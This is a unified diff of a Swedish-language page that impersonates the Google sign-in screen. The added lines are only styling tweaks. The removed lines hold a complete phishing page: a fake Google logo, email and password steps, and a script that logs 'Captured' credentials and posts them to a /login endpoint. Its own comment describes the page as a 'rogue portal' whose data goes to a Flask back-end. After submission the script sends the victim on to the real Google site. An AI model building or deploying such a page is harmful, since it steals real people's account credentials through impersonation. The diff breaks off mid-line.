@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="sv">
+<html lang="sv" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -11,13 +11,14 @@
             --text-main: #1f1f1f;
             --text-sub: #444746;
             --border-color: #747775;
+            --bg-color: #ffffff;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: "Google Sans", "Roboto", arial, sans-serif;
-            background-color: #fff;
+            background-color: #f0f2f1;
             color: var(--text-main);
             display: flex;
             flex-direction: column;
@@ -31,36 +32,59 @@
             width: 100%;
             max-width: 1040px;
             min-height: 480px;
-            background: #fff;
+            background: var(--bg-color);
             border-radius: 28px;
             padding: 36px;
             gap: 48px;
+            box-shadow: none;
         }
 
-        /* Side-by-side Layout */
-        .left-col { flex: 1; padding-top: 8px; }
-        .right-col { flex: 1; display: flex; flex-direction: column; justify-content: center; }
+        /* Side-by-side Layout (V3 Design) */
+        .left-col { 
+            flex: 1; 
+            padding-top: 8px; 
+            display: flex;
+            flex-direction: column;
+        }
+        .right-col { 
+            flex: 1; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+        }
 
-        .logo { margin-bottom: 24px; }
+        .logo { margin-bottom: 16px; }
         .logo svg { width: 48px; height: 48px; }
 
-        h1 { font-size: 36px; font-weight: 400; line-height: 44px; margin-bottom: 12px; }
-        .subtitle { font-size: 16px; line-height: 24px; color: var(--text-main); }
+        h1 { 
+            font-size: 36px; 
+            font-weight: 400; 
+            line-height: 44px; 
+            margin-bottom: 16px; 
+            color: var(--text-main);
+        }
+        .subtitle { 
+            font-size: 16px; 
+            line-height: 24px; 
+            color: var(--text-main);
+            margin-bottom: 8px;
+        }
 
         /* Form Styling */
         .input-group { margin-top: 24px; position: relative; }
         
         input {
             width: 100%;
-            padding: 16px;
+            padding: 13px 15px;
             font-size: 16px;
             border: 1px solid var(--border-color);
             border-radius: 4px;
             outline: none;
-            transition: border 0.1s;
+            color: var(--text-main);
+            background: transparent;
         }
 
-        input:focus { border: 2px solid var(--google-blue); padding: 15px; }
+        input:focus { border: 2px solid var(--google-blue); padding: 12px 14px; }
 
         .link-text {
             color: var(--google-blue);
@@ -69,6 +93,7 @@
             font-weight: 500;
             display: inline-block;
             margin-top: 9px;
+            cursor: pointer;
         }
         .link-text:hover { text-decoration: underline; }
 
@@ -83,8 +108,8 @@
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            gap: 24px;
-            margin-top: 8px;
+            gap: 8px;
+            margin-top: 40px;
         }
 
         .btn-next {
@@ -96,152 +121,50 @@
             font-weight: 500;
             font-size: 14px;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background 0.2s, box-shadow 0.2s;
         }
 
-        .btn-next:hover { background-color: var(--google-hover); box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+        .btn-next:hover { 
+            background-color: var(--google-hover); 
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--google-blue);
+            border: none;
+            padding: 10px 12px;
+            border-radius: 20px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .btn-secondary:hover { background: rgba(11, 87, 208, 0.04); }
 
         /* Step 2 specific styles */
         #password-step { display: none; }
         .user-pill {
             display: inline-flex;
             align-items: center;
-            padding: 4px 12px 4px 4px;
+            padding: 4px 12px 4px 6px;
             border: 1px solid #dadce0;
             border-radius: 16px;
             font-size: 14px;
             margin-bottom: 24px;
             cursor: pointer;
+            color: var(--text-main);
         }
         .user-pill:hover { background: #f8f9fa; }
 
         /* Responsive */
         @media (max-width: 850px) {
-            .container { flex-direction: column; padding: 24px; align-items: center; text-align: center; max-width: 450px; }
-            .left-col { flex: none; }
-            .actions { justify-content: space-between; width: 100%; }
-            .user-pill { margin: 0 auto 24px auto; }
-        }
-
-        /* Footer */
-        .footer {
-            width: 100%;
-            max-width: 1040px;
-            display: flex;
-            justify-content: space-between;
-            padding: 24px;
-            font-size: 12px;
-            color: var(--text-sub);
-        }
-        .footer-links a { text-decoration: none; color: var(--text-sub); margin-left: 24px; }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <div class="left-col">
-            <div class="logo">
-                <!-- Correct multicolor G icon -->
-                <svg viewBox="0 0 48 48">
-                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
-                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.13-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
-                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
-                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
-                    <path fill="none" d="M0 0h48v48H0z"></path>
-                </svg>
-            </div>
-            <h1 id="title">Logga in</h1>
-            <p class="subtitle" id="subtitle">Använd ditt Google-konto</p>
-        </div>
-
-        <div class="right-col">
-            <form id="login-form">
-                <!-- Step 1: Identifier -->
-                <div id="email-step">
-                    <div class="input-group">
-                        <input type="text" id="email" placeholder="E-post eller telefonnummer" required autofocus>
-                    </div>
-                    <a href="#" class="link-text">Har du glömt din e-postadress?</a>
-                    <div class="guest-text">
-                        Är detta inte din dator? Logga in privat med gästläget. <a href="#" class="link-text">Läs mer om hur du använder gästläget</a>
-                    </div>
-                    <div class="actions">
-                        <a href="#" class="link-text" style="margin-right:auto">Skapa konto</a>
-                        <button type="button" class="btn-next" onclick="toPassword()">Nästa</button>
-                    </div>
-                </div>
-
-                <!-- Step 2: Password -->
-                <div id="password-step">
-                    <div class="user-pill" onclick="toEmail()">
-                        <span id="display-email" style="font-weight:500"></span>
-                        <svg style="margin-left:8px" width="20" height="20" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
-                    </div>
-                    <div class="input-group">
-                        <input type="password" id="password" placeholder="Ange ditt lösenord" required>
-                    </div>
-                    <div style="margin-top: 8px;">
-                        <input type="checkbox" id="show-pw"> <label for="show-pw" style="font-size:14px">Visa lösenord</label>
-                    </div>
-                    <div class="actions" style="margin-top: 48px;">
-                        <a href="#" class="link-text" style="margin-right:auto">Glömt lösenordet?</a>
-                        <button type="submit" class="btn-next">Nästa</button>
-                    </div>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <div class="footer">
-        <div>Svenska ▼</div>
-        <div class="footer-links">
-            <a href="#">Hjälp</a>
-            <a href="#">Integritet</a>
-            <a href="#">Villkor</a>
-        </div>
-    </div>
-
-    <script>
-        const emailStep = document.getElementById('email-step');
-        const passwordStep = document.getElementById('password-step');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const displayEmail = document.getElementById('display-email');
-        const title = document.getElementById('title');
-        const subtitle = document.getElementById('subtitle');
-
-        function toPassword() {
-            if(emailInput.value.trim().length > 3) {
-                displayEmail.innerText = emailInput.value;
-                emailStep.style.display = 'none';
-                passwordStep.style.display = 'block';
-                title.innerText = 'Välkommen';
-                subtitle.innerText = '';
-                passwordInput.focus();
+            body { background-color: #fff; }
+            .container { 
+                flex-direction: column; 
+                padding: 24px; 
+                align-items: flex-start; 
+                text-align: left; 
+                max-width: 450px; 
+                min-height: auto;
             }
-        }
-
-        function toEmail() {
-            emailStep.style.display = 'block';
-            passwordStep.style.display = 'none';
-            title.innerText = 'Logga in';
-            subtitle.innerText = 'Använd ditt Google-konto';
-        }
-
-        document.getElementById('login-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            // In a real rogue portal, you'd send this to your Flask back-end
-            console.log("Captured:", emailInput.value, passwordInput.value);
-            
-            // Send the data
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "/login", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4) window.location.href = "https://accounts.google.com";
-            };
-            xhr.send("email=" + encodeURIComponent(emailInput.value) + "&password=" + encodeURIComponent(passwordInput.value));
-        });
-    </script>
-</body>
-</html>
+            .
